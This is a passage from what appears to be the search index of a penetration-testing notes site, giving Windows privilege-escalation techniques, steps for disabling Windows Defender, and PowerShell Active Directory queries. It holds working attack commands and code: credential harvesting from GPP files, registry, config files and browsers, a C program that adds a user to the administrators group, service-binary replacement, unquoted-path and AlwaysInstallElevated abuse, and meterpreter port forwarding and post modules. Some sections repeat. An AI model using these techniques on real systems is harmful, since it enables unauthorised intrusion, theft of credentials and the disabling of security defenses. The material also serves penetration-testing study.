you can make a remote forward to access it. # Port forward using plink plink.exe -l root -pw mysecretpassword 192.168.0.101 -R 8080:127.0.0.1:8080 # Port forward using meterpreter portfwd add -l <attacker port> -p <victim port> -r <victim ip> portfwd add -l 3306 -p 3306 -r 192.168.1.101 So how should we interpret the netstat output? Local address 0.0.0.0 Local address 0.0.0.0 means that the service is listening on all interfaces. This means that it can receive a connection from the network card, from the loopback interface or any other interface. This means that anyone can connect to it. Local address 127.0.0.1 Local address 127.0.0.1 means that the service is only listening for connection from the your PC. Not from the internet or anywhere else. This is interesting to us! Local address 192.168.1.9 Local address 192.168.1.9 means that the service is only listening for connections from the local network. So someone in the local network can connect to it, but not someone from the internet. This is also interesting to us! Vulnerable Drivers # Some driver might be vulnerable. I don't know how to check this in an efficient way. # List all drivers driverquery Hot potato # Never tried. https://foxglovesecurity.com/2016/01/16/hot-potato/ Scheduled Tasks - Only works on Windows 2000/xp/2003 # Here we are looking for tasks that are run by a privileged user, and run a binary that we can overwrite. schtasks /query /fo LIST /v This might produce a huge amount of text. I have not been able to figure out how to just output the relevant strings with findstr . So if you know a better way please notify me. As for now I just copy-paste the text and past it into my linux-terminal. Yeah I know this ain't pretty, but it works. You can of course change the name SYSTEM to another privileged user. cat schtask.txt | grep \"SYSTEM\\|Task To Run\" | grep -B 1 SYSTEM Escalate to SYSTEM from Administrator # On Windows XP and Older # If you have a GUI with a user that is included in Administrators group you first need to open up cmd.exe for the administrator. If you open up the cmd that is in Accessories it will be opened up as a normal user. And if you rightclick and do Run as Administrator you might need to know the Administrators password. Which you might not know. So instead you open up the cmd from c:\\windows\\system32\\cmd.exe . This will give you a cmd with Administrators rights. From here we want to become SYSTEM user. To do this we run: First we check what time it is on the local machine: time # Now we set the time we want the system CMD to start. Probably one minuter after the time. at 01:23 /interactive cmd.exe And then the cmd with SYSTEM privs pops up. Vista and Newer # You first need to upload PsExec.exe and then you run: psexec -i -s cmd.exe Kitrap # On some machines the at 20:20 trick does not work. It never works on Windows 2003 for example. Instead you can use Kitrap. Upload both files and execute vdmaillowed.exe . I think it only works with GUI. vdmallowed.exe vdmexploit.dll Using Metasploit # So if you have a metasploit meterpreter session going you can run getsystem . Post modules # Some interesting metasploit post-modules First you need to background the meterpreter shell and then you just run the post modules. You can also try some different post modules. use exploit/windows/local/service_permissions post/windows/gather/credentials/gpp run post/windows/gather/credential_collector run post/multi/recon/local_exploit_suggester run post/windows/gather/enum_shares run post/windows/gather/enum_snmp run post/windows/gather/enum_applications run post/windows/gather/enum_logged_on_users run post/windows/gather/checkvm References # http://travisaltman.com/windows-privilege-escalation-via-weak-service-permissions/ http://www.fuzzysecurity.com/tutorials/16.html https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/ http://it-ovid.blogspot.cl/2012/02/windows-privilege-escalation.html https://github.com/gentilkiwi/mimikatz http://bernardodamele.blogspot.cl/2011/12/dump-windows-password-hashes.html https://www.youtube.com/watch?v=kMG8IsCohHA&feature=youtu.be https://www.youtube.com/watch?v=PC_iMqiuIRQ http://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/ https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp http://pwnwiki.io/#!privesc/windows/index.md","title":"Local Privilige Escalation"},{"location":"attacking_active_directory_domain/local_privilege_escalation/local_privilege_escalation/#privilege-escalation-windows","text":"We now have a low-privileges shell that we want to escalate into a privileged shell.","title":"Privilege Escalation Windows"},{"location":"attacking_active_directory_domain/local_privilege_escalation/local_privilege_escalation/#basic-enumeration-of-the-system","text":"Before we start looking for privilege escalation opportunities we need to understand a bit about the machine. We need to know what users have privileges. What patches/hotfixes the system has. # Basics systeminfo hostname # Who am I? whoami echo %username% # What users/localgroups are on the machine? net users net localgroups # More info about a specific user. Check if user has privileges. net user user1 # View Domain Groups net group /domain # View Members of Domain Group net group /domain <Group Name> # Firewall netsh firewall show state netsh firewall show config # Network ipconfig /all route print arp -A # How well patched is the system? wmic qfe get Caption,Description,HotFixID,InstalledOn","title":"Basic Enumeration of the System"},{"location":"attacking_active_directory_domain/local_privilege_escalation/local_privilege_escalation/#1-group-policy-preference","text":"If the machine belongs to a domain and your user has access to System Volume Information there might be some sensitive files there. This is the easiest technique, and the one that should be tried first. First you need to find out which domain your user belongs to. You can do that by using the powershell Active directory module. If you do not have that module. See the helper-section to find out how to get it. You can do that with the following command: get-addomain AllowedDNSSuffixes : {} ChildDomains : {} ComputersContainer : CN=Computers,DC=hackdomain,DC=local DeletedObjectsContainer : CN=Deleted Objects,DC=hackdomain,DC=local DistinguishedName : DC=hackdomain,DC=local DNSRoot : hackdomain.local DomainControllersContainer : OU=Domain Controllers,DC=hackdomain,DC=local DomainMode : Windows2012R2Domain DomainSID : S-1-5-21-2900359584-3137434808-3022034389 ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=hackdomain,DC=local Forest : hackdomain.local InfrastructureMaster : DC1337.hackdomain.local LastLogonReplicationInterval : LinkedGroupPolicyObjects : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=hackdomain,DC=local} LostAndFoundContainer : CN=LostAndFound,DC=hackdomain,DC=local ManagedBy : Name : hackdomain NetBIOSName : HACKDOMAIN ObjectClass : domainDNS ObjectGUID : 176ed6af-a390-40f4-bbc2-e6f581089e90 ParentDomain : PDCEmulator : DC1337.hackdomain.local QuotasContainer : CN=NTDS Quotas,DC=hackdomain,DC=local ReadOnlyReplicaDirectoryServers : {} ReplicaDirectoryServers : {DC1337.hackdomain.local} RIDMaster : DC1337.hackdomain.local SubordinateReferences : {DC=ForestDnsZones,DC=hackdomain,DC=local, DC=DomainDnsZones,DC=hackdomain,DC=loca l, CN=Configuration,DC=hackdomain,DC=local} SystemsContainer : CN=System,DC=hackdomain,DC=local UsersContainer : CN=Users,DC=hackdomain,DC=local So you can clearly see hackdomain.local references everywhere. This is the domain-name. You can now go to \\\\hackdomain.local\\SYSVOL\\hackdomain.local\\policies and search for passwords there. You can either go with the explorer or with powershell. cd \\\\hackdomain.local\\SYSVOL findstr /r /s:cpassword","title":"1. Group Policy Preference"},{"location":"attacking_active_directory_domain/local_privilege_escalation/local_privilege_escalation/#using-powersploit","text":"You can use Get-GPPPassword from powersploit to get gpp-passwords. https://github.com/PowerShellMafia/PowerSploit/blob/dev/Exfiltration/Get-GPPPassword.ps1 You can also use Get-CachedGPPPassword . It is included in the PowerSploit Privesc module.","title":"Using PowerSploit"},{"location":"attacking_active_directory_domain/local_privilege_escalation/local_privilege_escalation/#using-metasploit","text":"post/windows/gather/credentials/gpp","title":"Using Metasploit"},{"location":"attacking_active_directory_domain/local_privilege_escalation/local_privilege_escalation/#manually","text":"First we need to map/mount that drive. In order to do that we need to know the IP-address of the domain controller. We can just look in the environment-variables # Output environment-variables set # Look for the following: LOGONSERVER=\\\\NAMEOFSERVER USERDNSDOMAIN=WHATEVER.LOCAL # Look up ip-addres nslookup nameofserver.whatever.local # It will output something like this Address: 192.168.1.101 # Now we mount it net use z: \\\\192.168.1.101\\SYSVOL # And enter it z: # Now we search for the groups.xml file dir Groups.xml /s If we find the file with a password in it, we can decrypt it like this in Kali gpp-decrypt encryptedpassword Services\\Services.xml: Element-Specific Attributes ScheduledTasks\\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element Printers\\Printers.xml: SharedPrinter Element Drives\\Drives.xml: Element-Specific Attributes DataSources\\DataSources.xml: Element-Specific Attributes","title":"Manually"},{"location":"attacking_active_directory_domain/local_privilege_escalation/local_privilege_escalation/#2-services-with-vulnerble-permissions","text":"Services on windows are programs that run in the background. Without a GUI. They are almost always started and run by NT Authority. Therefore the files, folder and registry keys need correct permissions.","title":"2. Services with Vulnerble Permissions"},{"location":"attacking_active_directory_domain/local_privilege_escalation/local_privilege_escalation/#21-insecure-registry-permissions","text":"In Windows, information related to services is stored in HKLM\\SYSTEM\\CurrentControlSet\\Services registry key. If we want to see information about a specific service, you can check HKLM\\SYSTEM\\ControlSet001\\Services\\Vulnerable Service . In that registry there is a key called ImagePath which contains a UNC path to the executable. So if an attacker has the permission to edit that key, the attacker can change it to point to an executable of his/hers choice. You can check if the registry is editable from the command-line but you can also check if from regedit.exe. It is uncommon that this key can be edited by a low priviliged user. But it is still something to test. References: https://pentestlab.blog/tag/imagepath/ https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/","title":"2.1 Insecure Registry Permissions"},{"location":"attacking_active_directory_domain/local_privilege_escalation/local_privilege_escalation/#22-insecure-service-permissions","text":"This attack is similar to the previous attack. But instead of changing the registry key we will change the Service-configuration. First we need to know which services out user has the right to configure. That can be done with the sysinternal tool accesschk.exe or with powersploit","title":"2.2 Insecure Service Permissions"},{"location":"attacking_active_directory_domain/local_privilege_escalation/local_privilege_escalation/#using-powersploit-privesc","text":"Enumerates all services and returns services for which the current user can modify the binPath. Get-ModifiableService Set-ServiceBinaryPath","title":"Using PowerSploit - Privesc"},{"location":"attacking_active_directory_domain/local_privilege_escalation/local_privilege_escalation/#using-accesschkexe","text":"accesschk.exe -uwcqv \"YourUser\" * All services that \"YourUser\" can modify will be listed. SERVICE_ALL_ACCESS means we have full control over modifying the properties of Vulnerable Service. For more details on how to actually change the binPath and restart the service see: https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/","title":"Using accesschk.exe"},{"location":"attacking_active_directory_domain/local_privilege_escalation/local_privilege_escalation/#manually_1","text":"First we need to find services. That can be done using wmci or sc.exe . Wmci is not available on all windows machines, and it might not be available to your user. If you don't have access to it, you can use sc.exe . WMCI wmic service list brief This will produce a lot out output and we need to know which one of all of these services have weak permissions. In order to check that we can use the icacls program. Notice that icacls is only available from Vista and up. XP and lower has cacls instead. As you can see in the command below you need to make sure that you have access to wimc , icacls and write privilege in C:\\windows\\temp . for /f \"tokens=2 delims='='\" %a in ('wmic service list full^|find /i \"pathname\"^|find /i /v \"system32\"') do @echo %a >> c:\\windows\\temp\\permissions.txt for /f eol^=^\"^ delims^=^\" %a in (c:\\windows\\temp\\permissions.txt) do cmd.exe /c icacls \"%a\" Binaries in system32 are excluded since they are mostly correct, since they are installed by windows. sc.exe sc query state= all | findstr \"SERVICE_NAME:\" >> Servicenames.txt FOR /F %i in (Servicenames.txt) DO echo %i type Servicenames.txt FOR /F \"tokens=2 delims= \" %i in (Servicenames.txt) DO @echo %i >> services.txt FOR /F %i in (services.txt) DO @sc qc %i | findstr \"BINARY_PATH_NAME\" >> path.txt Now you can process them one by one with the cacls command. cacls \"C:\\path\\to\\file.exe\" Look for Weakness What we are interested in is binaries that have been installed by the user. In the output you want to look for BUILTIN\\Users:(F) . Or where your user/usergroup has (F) or (C) rights. Example: C:\\path\\to\\file.exe BUILTIN\\Users:F BUILTIN\\Power Users:C BUILTIN\\Administrators:F NT AUTHORITY\\SYSTEM:F That means your user has write access. So you can just rename the .exe file and then add your own malicious binary. And then restart the program and your binary will be executed instead. This can be a simple getsuid program or a reverse shell that you create with msfvenom. Here is a POC code for getsuid. #include <stdlib.h> int main () { int i; i = system(\"net localgroup administrators theusername /add\"); return 0; } We then compile it with mingw like this: i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe Restart the Service Okay, so now that we have a malicious binary in place we need to restart the service so that it gets executed. We can do this by using wmic or net the following way: wmic service NAMEOFSERVICE call startservice net stop [service name] && net start [service name]. The binary should now be executed in the SYSTEM or Administrator context. Migrate the meterpreter shell If your meterpreter session dies right after you get it you need migrate it to a more stable service. A common service to migrate to is winlogon.exe since it is run by system and it is always run. You can find the PID like this: wmic process list brief | find \"winlogon\" So when you get the shell you can either type migrate PID or automate this so that meterpreter automatically migrates. http://chairofforgetfulness.blogspot.cl/2014/01/better-together-scexe-and.html","title":"Manually"},{"location":"attacking_active_directory_domain/local_privilege_escalation/local_privilege_escalation/#23-insecure-service-filefolder-permissions","text":"If you find a service where the low-priv user has write permissions in the of the binary that is started by the service, the user can switch the binary to an evil binary and have that binary executed by NT Authroity.","title":"2.3 Insecure Service File/folder permissions"},{"location":"attacking_active_directory_domain/local_privilege_escalation/local_privilege_escalation/#powersploit-privescpowerup","text":"The easiest way to find these vulnerabilities is with the Powersploit. Download the PowerSploit module Privesc. Unzip it and place the entire Privesc folder in the Documents folder of your user: \\Documents\\WindowsPowerShell\\Modules\\Privesc\\ Here you can download it: https://github.com/PowerShellMafia/PowerSploit/tree/dev/Privesc In order to import the module the easiest is to do the following in a powershell shell: powershell.exe -Exec bypass import-module Privesc # Check that it worked get-command -Module Privesc Now you can either run all checks to check all privesc possibilities. Or just check weak services with: invoke-AllChecks Now check for the output from Services-delen. If you have a domain-user check for files where the usergroup NT/Authenticated users can write files. If youy user can't restart the service you will have to restart the machine.","title":"PowerSploit Privesc/PowerUp"},{"location":"attacking_active_directory_domain/local_privilege_escalation/local_privilege_escalation/#3-unquoted-service-paths","text":"So the idea here is that if the path to a service binary/executable is (1) not surounded by quotation-marks (\"\"), and the and the attacker has write-permissions on The basic idea is to make a service execute a malicious binary when it is started. For this to work the following conditions must be met: 1. The UNC path must not be sourounded by quotes \"\". 2. The path must contain a space, for example \\windows\\my files\\test.exe . 3. The attacker must have write-permissions the directory with space in the name. So in the case it must have write permissions in \\my files\\ . The PATH to the service binary is set in the registry.","title":"3. Unquoted Service Paths"},{"location":"attacking_active_directory_domain/local_privilege_escalation/local_privilege_escalation/#exploit-with-powersploit","text":"Get-UnquotedService","title":"Exploit with PowerSploit"},{"location":"attacking_active_directory_domain/local_privilege_escalation/local_privilege_escalation/#manually_2","text":"Find Services With Unquoted Paths # Using WMIC wmic service get name,displayname,pathname,startmode |findstr /i \"auto\" |findstr /i /v \"c:\\windows\\\\\" |findstr /i /v \"\"\" # Using sc sc query sc qc service name # Look for Binary_path_name and see if it is unquoted. If the path contains a space and is not quoted, the service is vulnerable. Exploit It If the path to the binary is: c:\\Program Files\\something\\winamp.exe We can place a binary like this c:\\program.exe When the program is restarted it will execute the binary program.exe , which we of course control. We can do this in any directory that has a space in its name. Not only program files . This attack is explained here: http://toshellandback.com/2015/11/24/ms-priv-esc/ There is also a metasploit module for this is: exploit/windows/local/trusted_service_path","title":"Manually"},{"location":"attacking_active_directory_domain/local_privilege_escalation/local_privilege_escalation/#4-alwaysinstallelevated-install-new-program-as-privileged-user","text":"This is a pretty simple privilege escalation attack. If this registry key is set a user is able to install any program. And when it is installed, it is installed as administrator. This means that if the attacker creates a install-package, .msi file, and then clicks on it, the package will be installed by the administrator/NT Authority. So if the attacker creates a install-package that adds a new privilege user the new user will be created. Check to see if the registry key is set: reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated Or reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated http://toshellandback.com/2015/11/24/ms-priv-esc/ Exploit it using PowerUp.ps1 Write-UserAddMSI This will create an isntallation-file on the desktop. Once you click that you get a dialog where you can enter the new user and password you would like to create. It then gets created when you continue the installation.","title":"4. AlwaysInstallElevated - Install new program as privileged user"},{"location":"attacking_active_directory_domain/local_privilege_escalation/local_privilege_escalation/#5-dll-hijacking","text":"First check what services are running. Second, check if those services are running as LocalSystem. Third, check that the service is not a windows default service. Fourth, check if you have any directory in the PATH variable that you have write-permissions to. Now that you have enumerated the custom services that are running we need to find out if they load any DLL:s that doesn't exist.","title":"5. DLL Hijacking"},{"location":"attacking_active_directory_domain/local_privilege_escalation/local_privilege_escalation/#run-it-locally","text":"One way is to install the program locally on a computer where you are Administrator. You can run procmon at the same time, so that you can check what DLL:s it is trying to load.","title":"Run it locally"},{"location":"attacking_active_directory_domain/local_privilege_escalation/local_privilege_escalation/#check-the-executable-and-check-for-loadlibrary-functions","text":"I have never tried this tool, so who knows. There is a tool for this: https://github.com/Cybereason/siofra Otherwise you can maybe search for strings in the binary, take all the DLL:s that you find that it is invoking. Whether it exists or not. And then you create a malicios DLL and copy it to every name of the files you find when you searched for strings in the binary. No good method for it if you can't use Procmon. Read this https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/","title":"Check the executable and check for LoadLibrary functions."},{"location":"attacking_active_directory_domain/local_privilege_escalation/local_privilege_escalation/#6-check-installed-software-for-exploits","text":"Check what programs are installed on the machine, and google to to see if any of them contains local privilege escalations.","title":"6. Check installed software for exploits"},{"location":"attacking_active_directory_domain/local_privilege_escalation/local_privilege_escalation/#7-cleartext-passwords-stored-credentials","text":"","title":"7. Cleartext Passwords / Stored credentials"},{"location":"attacking_active_directory_domain/local_privilege_escalation/local_privilege_escalation/#search-for-them","text":"findstr /si password *.txt findstr /si password *.xml findstr /si password *.ini #Find all those strings in config files. dir /s *pass* == *cred* == *vnc* == *.config* # Find all passwords in all files. findstr /spin \"password\" *.* findstr /spin \"password\" *.*","title":"Search for them"},{"location":"attacking_active_directory_domain/local_privilege_escalation/local_privilege_escalation/#in-common-files","text":"These are common files to find them in. They might be base64-encoded. So look out for that. c:\\sysprep.inf c:\\sysprep\\sysprep.xml c:\\unattend.xml %WINDIR%\\Panther\\Unattend\\Unattended.xml %WINDIR%\\Panther\\Unattended.xml dir c:\\*vnc.ini /s /b dir c:\\*ultravnc.ini /s /b dir c:\\ /s /b | findstr /si *vnc.ini","title":"In Common Files"},{"location":"attacking_active_directory_domain/local_privilege_escalation/local_privilege_escalation/#in-registry","text":"# VNC reg query \"HKCU\\Software\\ORL\\WinVNC3\\Password\" # Windows autologin reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" # SNMP Paramters reg query \"HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP\" # Putty reg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\" # Search for password in registry reg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s","title":"In Registry"},{"location":"attacking_active_directory_domain/local_privilege_escalation/local_privilege_escalation/#check-browser-creds","text":"So if you gotten access to a machine as another user. You can check to see if that user has stored credentials in the browser. USe the following metasploit module: run post/windows/gather/enum_chrome run post/multi/gather/firefox_creds","title":"Check browser creds"},{"location":"attacking_active_directory_domain/local_privilege_escalation/local_privilege_escalation/#8-kernel-exploits","text":"Kernel exploits should be our last resource, since it might but the machine in an unstable state or create some other problem with the machine. Identify the hotfixes/patches systeminfo # or wmic qfe get Caption,Description,HotFixID,InstalledOn Python to Binary If we have an exploit written in python but we don't have python installed on the victim-machine we can always transform it into a binary with pyinstaller. Good trick to know.","title":"8. Kernel exploits"},{"location":"attacking_active_directory_domain/local_privilege_escalation/local_privilege_escalation/#service-only-available-from-inside","text":"Sometimes there are services that are only accessible from inside the network. For example a MySQL server might not be accessible from the outside, for security reasons. It is also common to have different administration applications that is only accessible from inside the network/machine. Like a printer interface, or something like that. These services might be more vulnerable since they are not meant to be seen from the outside. netstat -ano Example output: Proto Local address Remote address State User Inode PID/Program name ----- ------------- -------------- ----- ---- ----- ---------------- tcp 0.0.0.0:21 0.0.0.0:* LISTEN 0 0 - tcp 0.0.0.0:5900 0.0.0.0:* LISTEN 0 0 - tcp 0.0.0.0:6532 0.0.0.0:* LISTEN 0 0 - tcp 192.168.1.9:139 0.0.0.0:* LISTEN 0 0 - tcp 192.168.1.9:139 192.168.1.9:32874 TIME_WAIT 0 0 - tcp 192.168.1.9:445 192.168.1.9:40648 ESTABLISHED 0 0 - tcp 192.168.1.9:1166 192.168.1.9:139 TIME_WAIT 0 0 - tcp 192.168.1.9:27900 0.0.0.0:* LISTEN 0 0 - tcp 127.0.0.1:445 127.0.0.1:1159 ESTABLISHED 0 0 - tcp 127.0.0.1:27900 0.0.0.0:* LISTEN 0 0 - udp 0.0.0.0:135 0.0.0.0:* 0 0 - udp 192.168.1.9:500 0.0.0.0:* 0 0 - Look for LISTENING/LISTEN . Compare that to the scan you did from the outside. Does it contain any ports that are not accessible from the outside? If that is the case, maybe you can make a remote forward to access it. # Port forward using plink plink.exe -l root -pw mysecretpassword 192.168.0.101 -R 8080:127.0.0.1:8080 # Port forward using meterpreter portfwd add -l <attacker port> -p <victim port> -r <victim ip> portfwd add -l 3306 -p 3306 -r 192.168.1.101 So how should we interpret the netstat output? Local address 0.0.0.0 Local address 0.0.0.0 means that the service is listening on all interfaces. This means that it can receive a connection from the network card, from the loopback interface or any other interface. This means that anyone can connect to it. Local address 127.0.0.1 Local address 127.0.0.1 means that the service is only listening for connection from the your PC. Not from the internet or anywhere else. This is interesting to us! Local address 192.168.1.9 Local address 192.168.1.9 means that the service is only listening for connections from the local network. So someone in the local network can connect to it, but not someone from the internet. This is also interesting to us!","title":"Service only available from inside"},{"location":"attacking_active_directory_domain/local_privilege_escalation/local_privilege_escalation/#vulnerable-drivers","text":"Some driver might be vulnerable. I don't know how to check this in an efficient way. # List all drivers driverquery","title":"Vulnerable Drivers"},{"location":"attacking_active_directory_domain/local_privilege_escalation/local_privilege_escalation/#hot-potato","text":"Never tried. https://foxglovesecurity.com/2016/01/16/hot-potato/","title":"Hot potato"},{"location":"attacking_active_directory_domain/local_privilege_escalation/local_privilege_escalation/#scheduled-tasks-only-works-on-windows-2000xp2003","text":"Here we are looking for tasks that are run by a privileged user, and run a binary that we can overwrite. schtasks /query /fo LIST /v This might produce a huge amount of text. I have not been able to figure out how to just output the relevant strings with findstr . So if you know a better way please notify me. As for now I just copy-paste the text and past it into my linux-terminal. Yeah I know this ain't pretty, but it works. You can of course change the name SYSTEM to another privileged user. cat schtask.txt | grep \"SYSTEM\\|Task To Run\" | grep -B 1 SYSTEM","title":"Scheduled Tasks - Only works on Windows 2000/xp/2003"},{"location":"attacking_active_directory_domain/local_privilege_escalation/local_privilege_escalation/#escalate-to-system-from-administrator","text":"","title":"Escalate to SYSTEM from Administrator"},{"location":"attacking_active_directory_domain/local_privilege_escalation/local_privilege_escalation/#on-windows-xp-and-older","text":"If you have a GUI with a user that is included in Administrators group you first need to open up cmd.exe for the administrator. If you open up the cmd that is in Accessories it will be opened up as a normal user. And if you rightclick and do Run as Administrator you might need to know the Administrators password. Which you might not know. So instead you open up the cmd from c:\\windows\\system32\\cmd.exe . This will give you a cmd with Administrators rights. From here we want to become SYSTEM user. To do this we run: First we check what time it is on the local machine: time # Now we set the time we want the system CMD to start. Probably one minuter after the time. at 01:23 /interactive cmd.exe And then the cmd with SYSTEM privs pops up.","title":"On Windows XP and Older"},{"location":"attacking_active_directory_domain/local_privilege_escalation/local_privilege_escalation/#vista-and-newer","text":"You first need to upload PsExec.exe and then you run: psexec -i -s cmd.exe","title":"Vista and Newer"},{"location":"attacking_active_directory_domain/local_privilege_escalation/local_privilege_escalation/#kitrap","text":"On some machines the at 20:20 trick does not work. It never works on Windows 2003 for example. Instead you can use Kitrap. Upload both files and execute vdmaillowed.exe . I think it only works with GUI. vdmallowed.exe vdmexploit.dll","title":"Kitrap"},{"location":"attacking_active_directory_domain/local_privilege_escalation/local_privilege_escalation/#using-metasploit_1","text":"So if you have a metasploit meterpreter session going you can run getsystem .","title":"Using Metasploit"},{"location":"attacking_active_directory_domain/local_privilege_escalation/local_privilege_escalation/#post-modules","text":"Some interesting metasploit post-modules First you need to background the meterpreter shell and then you just run the post modules. You can also try some different post modules. use exploit/windows/local/service_permissions post/windows/gather/credentials/gpp run post/windows/gather/credential_collector run post/multi/recon/local_exploit_suggester run post/windows/gather/enum_shares run post/windows/gather/enum_snmp run post/windows/gather/enum_applications run post/windows/gather/enum_logged_on_users run post/windows/gather/checkvm","title":"Post modules"},{"location":"attacking_active_directory_domain/local_privilege_escalation/local_privilege_escalation/#references","text":"http://travisaltman.com/windows-privilege-escalation-via-weak-service-permissions/ http://www.fuzzysecurity.com/tutorials/16.html https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/ http://it-ovid.blogspot.cl/2012/02/windows-privilege-escalation.html https://github.com/gentilkiwi/mimikatz http://bernardodamele.blogspot.cl/2011/12/dump-windows-password-hashes.html https://www.youtube.com/watch?v=kMG8IsCohHA&feature=youtu.be https://www.youtube.com/watch?v=PC_iMqiuIRQ http://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/ https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp http://pwnwiki.io/#!privesc/windows/index.md","title":"References"},{"location":"attacking_active_directory_domain/local_privilege_escalation/shutdown_windows_defender/","text":"Shut down windows defender # On Windows 10 it can be difficult to turn off windows defender. The service cannot simply be stopped as an administrative user. Turn off via registry # Set the option DisabloeAntiSpyware to 1 in HKLM:\\Software\\Policies\\Microsoft\\Windows Defender This required a restart for me, and defender was subsequently turned on again after a few minutes. Turn off via high privileges # This is based on the fact that you already have local administrative access. Windows defender can be turned off by a process running in a security context similar to TrustedInstaller. From an administrative console: Start-Service TrustedInstaller # Get a LocalSystem shell psexec -s -i cmd.exe # Or using AccessTokenCLI start -s -e From a LocalSystem console (for example psexec from sysinternals helps here) AccessTokenCLI start -p <PID of trusted installer process> -e From the console running as TrustedInstaller: sc stop windefend","title":"Disable Windows Defender"},{"location":"attacking_active_directory_domain/local_privilege_escalation/shutdown_windows_defender/#shut-down-windows-defender","text":"On Windows 10 it can be difficult to turn off windows defender. The service cannot simply be stopped as an administrative user.","title":"Shut down windows defender"},{"location":"attacking_active_directory_domain/local_privilege_escalation/shutdown_windows_defender/#turn-off-via-registry","text":"Set the option DisabloeAntiSpyware to 1 in HKLM:\\Software\\Policies\\Microsoft\\Windows Defender This required a restart for me, and defender was subsequently turned on again after a few minutes.","title":"Turn off via registry"},{"location":"attacking_active_directory_domain/local_privilege_escalation/shutdown_windows_defender/#turn-off-via-high-privileges","text":"This is based on the fact that you already have local administrative access. Windows defender can be turned off by a process running in a security context similar to TrustedInstaller. From an administrative console: Start-Service TrustedInstaller # Get a LocalSystem shell psexec -s -i cmd.exe # Or using AccessTokenCLI start -s -e From a LocalSystem console (for example psexec from sysinternals helps here) AccessTokenCLI start -p <PID of trusted installer process> -e From the console running as TrustedInstaller: sc stop windefend","title":"Turn off via high privileges"},{"location":"attacking_active_directory_domain/powershell/activedirectory/","text":"Powershell - Active Directory # Raw LDAP queries # $searcher = New-Object System.DirectoryServices.DirectorySearcher $searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry(\"LDAP://dc=....\") $searcher.SearchScope = \"Subtree\" $searcher.Filter = \"<ldap filter>\" foreach($result in $results) { $item = $results.Properties } Module # Install active directory module and then Import-Module activedirectory Get information about users # Below command retrieves information about administrator Get-ADUser administrator All users Get-ADUser -filter \"*\" Get informaton about computers # All computers Get-ADComputers -filter \"*\" Get information about groups for a user # Below command retrieves all groups for the administrator account Get-ADPrincipalGroupMembership -Identity administrator Get information abouts Access Control Lists Locally # Get object information from local computer: Get-ACL Get Security Descriptor for \"C:\\Windows\" Get-Acl C:\\Windows Get Security Descrpitor for log files starting with k in windows folder Get-Acl -Path \"C:\\Windows\\k*.log\" Get Security Descriptor for Registry key Get-Acl -Path \"HKLM:\\System\\CurrentControlSet\\Control\" Get Security Descriptor for an object Get-Acl -InputObject (Get-StorageSubsystem -Name S087) Access control lists in an AD # Get object information from AD: (Spawns a new shell). Running comands in this new location retrieves ifnroamtion from AD (like Get-Acl) Import-Module activedirectory set-location ad: Get-ACL ... Otherwise you can use the distinguished name with the active directory drive mount point as prefix: Get-Acl \"AD:\\CN=qw...,DC=....\" Everything below is run after setting location to AD drive Get ACL information by using distinguished name Get-Acl \"OU=aaa,DC=somedomain,DC=tld\" Get-Acl (Get-ADOrganizationalUnit -filter \"Name -eq 'aaa'\") Creates a table of permissions for the Organizational Unit aaa, in domain somedomain.tld (Get-Acl (Get-ADOrganizationalUnit -filter \"Name -eq 'aaa'\")).Access | Format-Table IdentityReference, AccessControlType -AutoSize Add user to group # Add-ADGroupMember <adgroup> <adprincipal> Add-ADGroupMember SomeGroup SomUser Active Directory Drive # When loading the AD module, it creates an AD drive. Set your working location to the AD drive (makes commands run in the AD context instead, like dir) Set-Location ad: Set your working location to a specific domain in the AD drive Set-Location \"dc=somedomain,dc=local\" Search AD objects by SID # Get-ADObject -Filter \"objectSid -eq 'S-1-5-321-...'\" Queriying trusted domains (i.e. not your current domain) # Get-ADUser -Server other.domain.tld \"username\" Get ACLs for objects in trusted domains # New-PSDrive -Name AD2 -PSProvider ActiveDirectory -Server other.domain.tld -root \"//RootDSE/\" Get-ACL (\"AD2:\\\\\" + (Get-ADUser -Server other.domain.tld \"username\").DistinguishedName) Combination # Retreives all permissions on object for a user, and eveyr permission with only a SID, it performs a lookup to check what these SIDs are (Get-Acl \"AD:\\$((Get-ADUser vlad).DistinguishedName)\").Acess | Where-Object { $_.IdentityReference -like \"s-1-*\" } | Foreach { Get-ADObject -Filter \"objectSid -eq '$($_.IdentityReference)' } GPO handling # Retrieves all GPOs (Use -Domain to specify for a specific domain) Get-GPO -All Retreives all inherited GPOs for a domain or OU Get-GPInheritance -Target \"OU=aaa,DC=somedomain,DC=local\" -Domain somedomain.local Retrieves applied settings from a GPO named Test (Use -All for all GPOs) Get-GPOReport -Name Test -ReportType [XML|HTML] -Path C:\\GPOReports\\test.html Retreives all permissions for a GPO named Test Get-GPPermissions -Name Test -All Retreives the resultant set of policy applied to a user or computer, or both Get-GPResultantSetofPolicy -Path C:\\GPOReports\\sop.xml -ReportType XML [-Computer <>] [-User <>]","title":"Active Directory"},{"location":"attacking_active_directory_domain/powershell/activedirectory/#powershell-active-directory","text":"","title":"Powershell - Active Directory"},{"location":"attacking_active_directory_domain/powershell/activedirectory/#raw-ldap-queries","text":"$searcher = New-Object System.DirectoryServices.DirectorySearcher 